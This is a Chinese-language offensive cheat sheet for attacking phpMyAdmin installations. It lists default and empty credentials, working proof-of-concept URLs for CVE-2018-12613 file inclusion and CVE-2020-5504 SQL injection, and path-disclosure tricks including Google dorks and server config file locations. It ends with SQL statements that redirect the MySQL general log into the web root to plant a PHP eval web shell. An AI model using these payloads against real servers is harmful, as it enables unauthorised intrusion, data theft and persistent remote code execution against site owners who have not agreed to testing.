## 应用简介
phpMyAdmin是MySQL管理工具

## 默认密码

```http
默认 phpMyAdmin：用户名 root、密码 root 或空登陆
版本 2.11.3～2.11.4：用户名 'localhost'@'@" 登陆，无需密码
版本 2.11.9.2：用户名 root 登陆，无需密码
```

## [CVE-2018-12613]-远程文件包含

**漏洞概述**

```http
#影响范围
4.8.0
4.8.1
```

**漏洞利用**

POC

```http
http://127.0.0.1/phpMyAdmin-4.8.0/index.php?target=db_sql.php%253f/../../../../../../../../../../../../../../../../../../../../../../../phpStudy/PHPTutorial/WWW/phpinfo.php
```

遇到该漏洞,可以考虑自己写一个shell,然后去包含自己的sessionid来实现getshell

## [CVE-2020-5504]-后台SQL注入

**漏洞概述**

```http
#影响范围
<= 5.00
```

**漏洞利用**

POC

```http
http://127.0.0.1/server_privileges.php?ajax_request=true&validate_username=1&username=1%27and%20extractvalue(1,concat(0x7e,(select%20user()),0x7e))--+db=&token=c2064a8c5f437da931fa01de5aec6581&viewing_mode=server
```

## php爆绝对路径

单引号爆路径

```http
xx.php?id=1'
```

错误参数值爆路径

```http
xxx.php?id=-1
```

Google爆路径

```http
Site:xxx.edu "warning"
Site:xxx.com "fatal error"
```

测试文件爆路径

```http
test.php
ceshi.php
info.php
phpinfo.php
php_info.php
1.php
```

phpmyadmin爆路径

```http
/phpMyAdmin/index.php?lang[]=1
/phpmyadmin/themes/darkblue_orange/layout.inc.php

/phpmyadmin/libraries/lect_lang.lib.php
/phpmyadmin/libraries/select_lang.lib.php
/phpmyadmin/libraries/lect_lang.lib.php
/phpmyadmin/libraries/mcrypt.lib.php
```

配置文件找路径

```bash
Windows:
c:\windows\php.ini php配置文件
c:\windows\system32\inetsrv\MetaBase.xml IIS虚拟主机配置文件


Linux:
/etc/php.ini php配置文件
/etc/httpd/conf.d/php.conf
/etc/httpd/conf/httpd.conf Apache配置文件
/usr/local/apache/conf/httpd.conf
/usr/local/apache2/conf/httpd.conf
/usr/local/apache/conf/extra/httpd-vhosts.conf 虚拟目录配置文件
```

nginx文件类型错误解析爆路径

```http
www.xxx.com/xx.jpg/x.php
```

## phpMyAdmin利用日志写shell

```sql
set global general_log='on'      
--开启日志

set global  general_log_file ="C:/phpStudy/PHPTutorial/WWW/shell.php"
--日志写入的文件

select "<?php eval($_POST['x'])?>"
--执行带有一句话的sql语句
```

其它写shell方法也和mysql写shell一样